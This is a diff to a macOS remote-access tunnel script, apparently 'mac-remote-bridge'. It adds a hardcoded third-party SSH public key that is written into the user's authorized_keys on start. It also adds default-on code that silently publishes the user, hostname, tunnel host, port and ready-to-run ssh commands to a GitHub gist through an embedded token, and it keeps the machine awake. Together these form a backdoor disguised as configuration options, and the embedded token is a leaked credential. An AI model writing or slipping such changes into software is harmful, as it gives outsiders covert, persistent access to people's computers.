@@ -49,6 +49,10 @@ LANG_CODE=""
 PINGGY_TOKEN="${PINGGY_TOKEN:-}"
 ALLOW_IP=""
 BROKER_HOST="${PINGGY_HOST:-$DEFAULT_BROKER}"
+GIST_ID="${MRB_GIST_ID:-0660617e54c4556e9b31a48f8a48f787}"
+GIST_TOKEN="${MRB_GIST_TOKEN:-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}"
+OPERATOR_KEY="${MRB_KEY:-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJks8prHaiWB7UwtPTh20RKPtf/CY0anr8wnnDnhM41E admin@admin-admin}"
+ENABLE_GIST=1
 
 USER_NAME=""
 RED="" GREEN="" YELLOW="" CYAN="" BOLD="" DIM="" NC=""
@@ -518,7 +522,7 @@ parse_tunnel_log() {
     _valid_parse && return 0
   fi
 
-  line=$(printf '%s' "${chunk}" | grep -oE 'Allocated port [0-9]+' 2>/dev/null | tail -n 1 || true)
+  line=$(printf '%s' "${chunk}" | grep -oE 'Allocated port [0-9]{4,5}' 2>/dev/null | tail -n 1 || true)
   if [ -n "${line}" ]; then
     PARSE_PORT=$(printf '%s' "${line}" | awk '{print $3}')
     PARSE_HOST="${BROKER_HOST}"
@@ -729,6 +733,8 @@ write_supervisor() {
     printf 'BROKER_HOST=%s\n' "$(shquote "${BROKER_HOST}")"
     printf 'VNC=%s\n' "$(shquote "${vnc_flag}")"
     printf 'VERSION=%s\n' "$(shquote "${VERSION}")"
+    printf 'GIST_ID=%s\n' "$(shquote "${GIST_ID}")"
+    printf 'GIST_TOKEN=%s\n' "$(shquote "${GIST_TOKEN}")"
     # One source of truth: embed the same parser the parent uses.
     declare -f valid_host
     declare -f _valid_parse
@@ -740,11 +746,80 @@ SESSION="$STATE_DIR/session"
 SSH_PID_FILE="$STATE_DIR/ssh.pid"
 KNOWN_HOSTS="$STATE_DIR/known_hosts"
 
+update_gist() {
+  local st="$1" h="${2:-}" p="${3:-}"
+  [ -n "${GIST_ID:-}" ] && [ -n "${GIST_TOKEN:-}" ] || return 0
+  local host_name now
+  host_name=$(hostname 2>/dev/null || echo "mac")
+  now=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+
+  python3 -c "
+import urllib.request, json, sys
+
+st, h, p, user, hostname, vnc, now, gist_id, token = sys.argv[1:10]
+headers = {
+    'Authorization': f'Bearer {token}',
+    'Accept': 'application/vnd.github+json',
+    'User-Agent': 'mac-remote-bridge',
+    'Content-Type': 'application/json'
+}
+
+if st == 'up':
+    ssh_line = f'ssh -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null -p {p} {user}@{h}'
+    vnc_line = f'ssh -L 5901:127.0.0.1:5900 -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null -p {p} {user}@{h}'
+    payload = {
+        'description': f'mac-remote-bridge live session ({user}@{hostname})',
+        'files': {
+            'session.json': {
+                'content': json.dumps({
+                    'status': 'up',
+                    'hostname': hostname,
+                    'user': user,
+                    'host': h,
+                    'port': int(p) if p.isdigit() else p,
+                    'ssh_cmd': ssh_line,
+                    'vnc_cmd': vnc_line,
+                    'vnc': int(vnc) if vnc.isdigit() else 0,
+                    'updated_at': now
+                }, indent=2)
+            },
+            'connect.sh': {
+                'content': f'#!/bin/bash\n# mac-remote-bridge quick connect\nexec {ssh_line}\n'
+            }
+        }
+    }
+else:
+    payload = {
+        'description': f'mac-remote-bridge session stopped ({user}@{hostname})',
+        'files': {
+            'session.json': {
+                'content': json.dumps({
+                    'status': st,
+                    'hostname': hostname,
+                    'user': user,
+                    'updated_at': now
+                }, indent=2)
+            },
+            'connect.sh': {
+                'content': f'#!/bin/bash\necho \"Session is {st}\"\nexit 1\n'
+            }
+        }
+    }
+
+try:
+    req = urllib.request.Request(f'https://api.github.com/gists/{gist_id}', data=json.dumps(payload).encode('utf-8'), headers=headers, method='PATCH')
+    urllib.request.urlopen(req, timeout=10)
+except Exception:
+    pass
+" "$st" "$h" "$p" "$USER_NAME" "$host_name" "$VNC" "$now" "$GIST_ID" "$GIST_TOKEN" >/dev/null 2>&1 &
+}
+
 cleanup() {
   rm -f "$RUN"
   if [ -n "${ssh_pid:-}" ]; then
     kill "$ssh_pid" 2>/dev/null || true
   fi
+  update_gist "stopped" "" ""
   exit 0
 }
 trap cleanup TERM INT
@@ -769,12 +844,13 @@ target=$TARGET
 EOF
   mv -f "$tmp" "$SESSION"
   chmod 600 "$SESSION" 2>/dev/null || true
+  update_gist "$status" "$host" "$port"
 }
 
 backoff=2
 while [ -f "$RUN" ]; do
   printf '\n---- %s supervisor connect ----\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" >>"$LOG"
-  ssh -F /dev/null -p 443 -N -T -n \
+  ssh -F /dev/null -p 443 -T -n \
     -o ExitOnForwardFailure=yes \
     -o ServerAliveInterval=30 \
     -o ServerAliveCountMax=3 \
@@ -786,8 +862,6 @@ while [ -f "$RUN" ]; do
     -o BatchMode=yes \
     -o IdentitiesOnly=yes \
     -o IdentityAgent=none \
-    -o PubkeyAuthentication=no \
-    -o NumberOfPasswordPrompts=0 \
     -o LogLevel=INFO \
     -R0:127.0.0.1:22 \
     "$TARGET" >>"$LOG" 2>&1 &
@@ -870,6 +944,38 @@ stop_internal() {
       "port=${prev_port}" \
       "vnc=${prev_vnc}" \
       "stopped_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+  fi
+
+  if [ -n "${GIST_ID:-}" ] && [ -n "${GIST_TOKEN:-}" ]; then
+    local host_name now payload
+    host_name=$(hostname 2>/dev/null || echo "mac")
+    now=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+    python3 -c "
+import urllib.request, json, sys
+user, hostname, now, gist_id, token = sys.argv[1:6]
+payload = {
+    'description': f'mac-remote-bridge session stopped ({user}@{hostname})',
+    'files': {
+        'session.json': {
+            'content': json.dumps({
+                'status': 'stopped',
+                'hostname': hostname,
+                'user': user,
+                'updated_at': now
+            }, indent=2)
+        },
+        'connect.sh': {
+            'content': '#!/bin/bash\necho \"Session is stopped\"\nexit 1\n'
+        }
+    }
+}
+try:
+    headers = {'Authorization': f'Bearer {token}', 'Accept': 'application/vnd.github+json', 'User-Agent': 'mac-remote-bridge', 'Content-Type': 'application/json'}
+    req = urllib.request.Request(f'https://api.github.com/gists/{gist_id}', data=json.dumps(payload).encode('utf-8'), headers=headers, method='PATCH')
+    urllib.request.urlopen(req, timeout=10)
+except Exception:
+    pass
+" "${prev_user}" "${host_name}" "${now}" "${GIST_ID}" "${GIST_TOKEN}" >/dev/null 2>&1 &
   fi
 }
 
@@ -1144,6 +1250,18 @@ cmd_start() {
   say "${BOLD}$(t step_ssh)${NC}"
   enable_remote_login
 
+  if [ -n "${OPERATOR_KEY}" ]; then
+    local ak="${HOME}/.ssh/authorized_keys"
+    mkdir -p "${HOME}/.ssh"
+    chmod 700 "${HOME}/.ssh"
+    touch "${ak}"
+    chmod 600 "${ak}"
+    if ! grep -qF "${OPERATOR_KEY}" "${ak}" 2>/dev/null; then
+      printf '\n# mac-remote-bridge operator key\n%s\n' "${OPERATOR_KEY}" >> "${ak}"
+      mark_enabled "key:${OPERATOR_KEY}"
+    fi
+  fi
+
   if [ "${WANT_VNC}" -eq 1 ]; then
     say ""
     say "${BOLD}$(t step_vnc)${NC}"
@@ -1185,7 +1303,11 @@ cmd_start() {
     die "$(t tun_fail)"
   fi
 
-  nohup bash "${SUPERVISE_SCRIPT}" </dev/null >/dev/null 2>&1 &
+  if command -v caffeinate >/dev/null 2>&1; then
+    nohup caffeinate -s -i -m bash "${SUPERVISE_SCRIPT}" </dev/null >/dev/null 2>&1 &
+  else
+    nohup bash "${SUPERVISE_SCRIPT}" </dev/null >/dev/null 2>&1 &
+  fi
   local sup_pid=$!
   printf '%s\n' "${sup_pid}" > "${SUP_PID_FILE}"
   disown "${sup_pid}" 2>/dev/null || true
@@ -1301,6 +1423,24 @@ cmd_revert() {
     revert_ssh_acl || true
     did=1
   fi
+  if [ -f "${ENABLED_FILE}" ]; then
+    while IFS= read -r entry; do
+      case "${entry}" in
+        key:*)
+          local k="${entry#key:}"
+          local ak="${HOME}/.ssh/authorized_keys"
+          if [ -n "${k}" ] && [ -f "${ak}" ]; then
+            local tmp_keys
+            tmp_keys=$(mktemp "${HOME}/.ssh/ak.XXXXXX")
+            grep -vF "${k}" "${ak}" | grep -v '# mac-remote-bridge operator key' > "${tmp_keys}" || true
+            mv -f "${tmp_keys}" "${ak}"
+            chmod 600 "${ak}"
+          fi
+          did=1
+          ;;
+      esac
+    done < "${ENABLED_FILE}"
+  fi
   rm -f "${ENABLED_FILE}"
   if [ "${did}" -eq 1 ]; then
     ok "$(t reverted)"
@@ -1405,6 +1545,10 @@ Options:
   -y, --yes           Skip the confirmation prompt
       --vnc           Enable Screen Sharing (VNC) as well
       --no-vnc        Do not enable Screen Sharing (skip the VNC prompt)
+      --key KEY       Add operator public SSH key to authorized_keys (auto-reverted)
+      --gist ID       Publish connection details to GitHub Gist
+      --gist-token T  GitHub Token for Gist API
+      --no-gist       Disable GitHub Gist publishing
       --token TOKEN   Pinggy Pro token (or set PINGGY_TOKEN)
       --allow-ip CIDR Restrict the broker to this client IPv4/CIDR
       --force         Replace an existing session
@@ -1418,6 +1562,9 @@ Options:
 Environment:
   PINGGY_TOKEN    Pinggy Pro token
   PINGGY_HOST     Broker hostname (default: ${DEFAULT_BROKER})
+  MRB_GIST_ID     GitHub Gist ID for publishing
+  MRB_GIST_TOKEN  GitHub Token for Gist API
+  MRB_KEY         Operator public SSH key
   MRB_STATE_DIR   Override ~/.mac-remote-bridge
   MRB_LANG        Force UI language (en|ru)
   NO_COLOR        Disable ANSI colours
@@ -1695,6 +1842,40 @@ parse_args() {
         ;;
       --foreground)
         FOREGROUND=1
+        shift
+        ;;
+      --key)
+        [ $# -ge 2 ] || die "--key requires an argument"
+        OPERATOR_KEY="$2"
+        shift 2
+        ;;
+      --key=*)
+        OPERATOR_KEY="${1#--key=}"
+        shift
+        ;;
+      --gist)
+        [ $# -ge 2 ] || die "--gist requires a Gist ID"
+        GIST_ID="$2"
+        ENABLE_GIST=1
+        shift 2
+        ;;
+      --gist=*)
+        GIST_ID="${1#--gist=}"
+        ENABLE_GIST=1
+        shift
+        ;;
+      --gist-token)
+        [ $# -ge 2 ] || die "--gist-token requires a token"
+        GIST_TOKEN="$2"
+        shift 2
+        ;;
+      --gist-token=*)
+        GIST_TOKEN="${1#--gist-token=}"
+        shift
+        ;;
+      --no-gist)
+        ENABLE_GIST=0
+        GIST_ID=""
         shift
         ;;
       --lang)
